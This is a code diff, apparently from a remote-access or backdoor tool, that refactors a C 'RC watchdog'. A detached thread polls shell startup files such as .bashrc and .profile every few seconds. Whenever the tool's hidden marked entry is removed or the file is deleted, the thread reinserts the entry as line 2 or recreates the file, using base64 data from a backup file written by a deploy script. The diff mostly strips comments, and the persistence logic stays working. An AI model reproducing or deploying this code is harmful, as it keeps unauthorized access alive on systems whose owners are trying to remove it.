@@ -91,27 +91,23 @@ home_dir(void)
  * RC Watchdog: monitors rc-files (.bashrc, .profile, etc.) and restores
  * our persistent entry if it is removed or the file is deleted.
  * Uses stat()-based polling — no inotify/kqueue required, works everywhere.
- * The backup data (marker + entry, base64-encoded) is read from the .rcb
- * file written by deploy.sh next to the secret file.
+ * Only compiled when pthread is available.
  * ----------------------------------------------------------------------- */
-
 #ifdef HAVE_PTHREAD
 # include <pthread.h>
-#endif
 
 #define RC_WATCH_INTERVAL_SEC   3   /* poll every 3 seconds */
 #define RC_MAX_FILES            8   /* max rc-files to watch */
 #define RC_ENTRY_MAX            4096
 
 typedef struct {
-	char paths[RC_MAX_FILES][GS_PATH_MAX]; /* rc file paths to watch */
+	char paths[RC_MAX_FILES][GS_PATH_MAX];
 	int  n_paths;
-	char marker[256];          /* BIN_HIDDEN_NAME used to identify our line */
-	char entry[RC_ENTRY_MAX];  /* PROFILE_LINE to restore */
+	char marker[256];
+	char entry[RC_ENTRY_MAX];
 } rc_watch_ctx_t;
 
-/* Simple base64 decode: decodes src (null-terminated) into dst.
- * Returns decoded length or -1 on error. */
+/* Simple base64 decode. Returns decoded length or -1 on error. */
 static int
 b64_decode(const char *src, char *dst, size_t dst_len)
 {
@@ -136,7 +132,7 @@ b64_decode(const char *src, char *dst, size_t dst_len)
 	return (int)out;
 }
 
-/* Check if 'marker' appears in file at 'path'. Returns 1 if found, 0 if not. */
+/* Returns 1 if marker string is found in file, 0 otherwise. */
 static int
 rc_marker_present(const char *path, const char *marker)
 {
@@ -145,7 +141,7 @@ rc_marker_present(const char *path, const char *marker)
 
 	fp = fopen(path, "r");
 	if (fp == NULL)
-		return 0; /* file gone */
+		return 0;
 
 	while (fgets(line, sizeof line, fp) != NULL) {
 		if (strstr(line, marker) != NULL) {
@@ -157,7 +153,7 @@ rc_marker_present(const char *path, const char *marker)
 	return 0;
 }
 
-/* Inject our entry as line 2 of the rc-file (or create file if missing). */
+/* Inject entry as line 2 of path, or create file if it doesn't exist. */
 static void
 rc_restore_file(const char *path, const char *entry)
 {
@@ -171,7 +167,6 @@ rc_restore_file(const char *path, const char *entry)
 
 	fp = fopen(path, "r");
 	if (fp == NULL) {
-		/* File deleted — recreate with just our entry */
 		fp = fopen(path, "w");
 		if (fp == NULL) return;
 		fprintf(fp, "%s\n", entry);
@@ -179,7 +174,6 @@ rc_restore_file(const char *path, const char *entry)
 		return;
 	}
 
-	/* Read line 1 */
 	if (fgets(line1, sizeof line1, fp) == NULL) {
 		fclose(fp);
 		fp = fopen(path, "w");
@@ -189,16 +183,13 @@ rc_restore_file(const char *path, const char *entry)
 		return;
 	}
 
-	/* Read the rest */
 	rest_len = fread(rest_buf, 1, sizeof rest_buf - 1, fp);
 	rest_buf[rest_len] = '\0';
 	fclose(fp);
 
-	/* Write to tmp then rename (atomic) */
 	fp = fopen(tmp_path, "w");
 	if (fp == NULL) return;
 
-	/* line1 already contains \n */
 	fputs(line1, fp);
 	fprintf(fp, "%s\n", entry);
 	if (rest_len > 0)
@@ -208,12 +199,7 @@ rc_restore_file(const char *path, const char *entry)
 	rename(tmp_path, path);
 }
 
-/* Load watchdog context from the .rcb backup file created by deploy.sh.
- * Format (each line):  KEY=<base64value>
- *   GS_RC_FILE=...   (may appear multiple times)
- *   GS_RC_MARKER=...
- *   GS_RC_ENTRY=...
- * Returns 0 on success, -1 if file unreadable or data missing. */
+/* Parse .rcb backup file (KEY=base64value lines). Returns 0 on success. */
 static int
 rc_load_backup(const char *rcb_path, rc_watch_ctx_t *ctx)
 {
@@ -253,14 +239,12 @@ rc_load_backup(const char *rcb_path, rc_watch_ctx_t *ctx)
 	return 0;
 }
 
-#ifdef HAVE_PTHREAD
 static void *
 rc_watcher_thread(void *arg)
 {
 	rc_watch_ctx_t *ctx = (rc_watch_ctx_t *)arg;
 	int i;
 
-	/* Detach so resources are released on exit */
 	pthread_detach(pthread_self());
 
 	while (1) {
@@ -268,14 +252,10 @@ rc_watcher_thread(void *arg)
 			const char *path = ctx->paths[i];
 			struct stat st;
 
-			if (stat(path, &st) != 0) {
-				/* File missing — recreate */
+			if (stat(path, &st) != 0)
 				rc_restore_file(path, ctx->entry);
-			} else {
-				/* File exists — check marker */
-				if (!rc_marker_present(path, ctx->marker))
-					rc_restore_file(path, ctx->entry);
-			}
+			else if (!rc_marker_present(path, ctx->marker))
+				rc_restore_file(path, ctx->entry);
 		}
 		sleep(RC_WATCH_INTERVAL_SEC);
 	}
@@ -283,11 +263,10 @@ rc_watcher_thread(void *arg)
 	free(ctx);
 	return NULL;
 }
+
 #endif /* HAVE_PTHREAD */
 
-/* Start the RC watchdog thread.
- * rcb_path: path to the .rcb file written by deploy.sh.
- * Call once from do_server() at startup. */
+/* Start the RC watchdog thread (no-op if pthread not available). */
 void
 rc_watcher_start_c(const char *rcb_path)
 {
@@ -309,9 +288,10 @@ rc_watcher_start_c(const char *rcb_path)
 
 	if (pthread_create(&tid, NULL, rc_watcher_thread, ctx) != 0)
 		free(ctx);
-	/* tid is detached inside thread */
 #endif /* HAVE_PTHREAD */
 }
+
+
 
 
 static int
